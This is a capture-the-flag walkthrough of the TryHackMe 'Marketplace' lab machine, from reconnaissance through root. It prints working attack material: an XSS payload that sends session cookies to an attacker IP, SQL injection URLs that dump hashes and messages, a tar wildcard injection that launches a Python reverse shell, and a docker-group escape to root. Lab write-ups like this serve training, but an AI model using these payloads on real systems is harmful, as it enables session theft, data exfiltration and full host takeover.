CTF URL:https://tryhackme.com/r/room/marketplace
# IP
```
10.10.177.197
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 10.10.177.197 -v

nmap -p22,80,32768 -sS -sC -sV 10.10.177.197 -v
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## WEB 
80 and 32768
80 is proxied with NGINX
### Dirb
```bash
dirb http://10.10.177.197/
# result
/admin
```
### Nikto
```bash
nikto -h 10.10.177.197
# result
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.177.197
+ Target Hostname:    10.10.177.197
+ Target Port:        80
+ Start Time:         2024-04-24 06:42:11 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.19.2
+ /: Retrieved x-powered-by header: Express.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ OPTIONS: Allowed HTTP Methods: GET, HEAD .
+ /login/: This might be interesting.

+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8075 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2024-04-24 06:56:52 (GMT-4) (881 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
## Manually
### Users
- michael
- jake

### JWT?
request
```bash
curl -X GET 'http://10.10.177.197:32768/login' -H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiZWxudXIiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTcxMzk1NTkyNX0.BQKP_6JPKu8CfFcJqurz7FeFYMHaZddLcB0lXUFhCX8' -v 
```
decoded jwt's payload (https://jwt.io/)
```JSON
{
  "userId": 4,
  "username": "elnur",
  "admin": false,
  "iat": 1713955925
}
```
## XSS
https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
to steal cookie with XSS
```bash
python XSS-cookie-stealer.py
```

```html
<script> var i=new Image;i.src="http://10.8.97.245:8888/?"+document.cookie;</script>
```
result:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MTM5NTgzMDF9.Y2FkIP5f-V8dxKtI_KzEATUfYgbYvYfnWDMd1WjIqmo
```
after changing your token in browser you become michael with admin access
```
THM{c37a63895910e478f28669b048c348d5}

User system
ID: 1
Is administrator: false

User michael
ID: 2
Is administrator: true

User jake
ID: 3
Is administrator: true

User elnur
ID: 4
Is administrator: false
```
# SQLi
`http://10.10.177.197:32768/admin?user=%27`
`http://10.10.177.197:32768/admin?user=0%20union%20select%201,1,1,1%20--%20-`
version -  8.0.21 
user and passwords
```
http://10.10.177.197:32768/admin?user=0%20union%20select%20(select%20password%20from%20users%20limit%201,1),1,1,1%20--%20-
```
gives following
```
jake:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q 
michael:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG 
system:$2b$10$wpwFeQWMpth5ARRow036LeJnxSJ7ulwfLWeBHYraYPji5dO25DEf. 
```
non crackable


```
http://10.10.177.197:32768/admin?user=0%20UNION%20SELECT%201,GROUP_CONCAT(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema=%27marketplace%27

items,messages,users 

there is messages table

http://10.10.177.197:32768/admin?user=0%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_schema=%27marketplace%27%20AND%20table_name=%27messages%27

id,is_read,message_content,user_from,user_to 

0 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM marketplace.messages
gives us




Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,',',',',',',',',',',',',',',',',',',',',',',',',',',',Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Than 
```

A password: `@b_ENXkGYUCAv3zJ` and it is jake's password
```bash
jake@the-marketplace:~$ cat user.txt 
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```
# PrivEsc to Michael
sudo -l
```bash
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
jake@the-marketplace:~$ ll /opt/backups/backup.sh
-rwxr-xr-x 1 michael michael 73 Aug 23  2020 /opt/backups/backup.sh*
jake@the-marketplace:~$ cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```
wildcard in tar, so
```bash
echo $'/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.97.245\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")\'' > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 1337         
listening on [any] 1337 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.177.197] 46216
$ whoami
whoami
michael
$ 
```
# Privesc to Root
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```

```bash
michael@the-marketplace:/home/marketplace$ ll
total 64
drwxr-xr-x 9 marketplace marketplace 4096 Sep  1  2020 ./
drwxr-xr-x 5 root        root        4096 Aug 23  2020 ../
lrwxrwxrwx 1 marketplace marketplace    9 Aug 23  2020 .bash_history -> /dev/null
-rw-r--r-- 1 marketplace marketplace  220 Aug 23  2020 .bash_logout
-rw-r--r-- 1 marketplace marketplace 3968 Aug 23  2020 .bashrc
drwx------ 3 marketplace marketplace 4096 Aug 23  2020 .cache/
drwx------ 4 marketplace marketplace 4096 Sep  1  2020 .config/
drwx------ 3 marketplace marketplace 4096 Aug 23  2020 .gnupg/
-rw------- 1 root        root          97 Aug 23  2020 .mysql_history
drwxrwxr-x 4 marketplace marketplace 4096 Aug 23  2020 .npm/
drwxrwxr-x 8 marketplace marketplace 4096 Aug 23  2020 .nvm/
-rw-r--r-- 1 marketplace marketplace  807 Aug 23  2020 .profile
-rw-rw-r-- 1 marketplace marketplace   66 Aug 23  2020 .selected_editor
-rwxrwxr-x 1 marketplace marketplace   65 Sep  1  2020 startup.sh*
-rw-r--r-- 1 marketplace marketplace    0 Aug 23  2020 .sudo_as_admin_successful
drwxr----- 8 marketplace marketplace 4096 Sep  1  2020 the-marketplace/
drwxrwxr-x 3 marketplace marketplace 4096 Aug 23  2020 .yarn/
-rw-rw-r-- 1 marketplace marketplace  116 Aug 23  2020 .yarnrc

michael@the-marketplace:/home/marketplace$ cat startup.sh
cd /home/marketplace/the-marketplace; docker-compose up -d; done

michael@the-marketplace:/home/marketplace$ groups
michael docker

michael@the-marketplace:/home/marketplace$ la the-marketplace/
ls: cannot open directory 'the-marketplace/': Permission denied
```
we are in container
```bash
michael@the-marketplace:~$ docker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        3 years ago         2.16GB
nginx                        latest              4bb46517cac3        3 years ago         133MB
node                         lts-buster          9c4cc2688584        3 years ago         886MB
mysql                        latest              0d64f46acfd1        3 years ago         544MB
alpine                       latest              a24bb4013296        3 years ago         5.57MB
michael@the-marketplace:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
# cat root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```
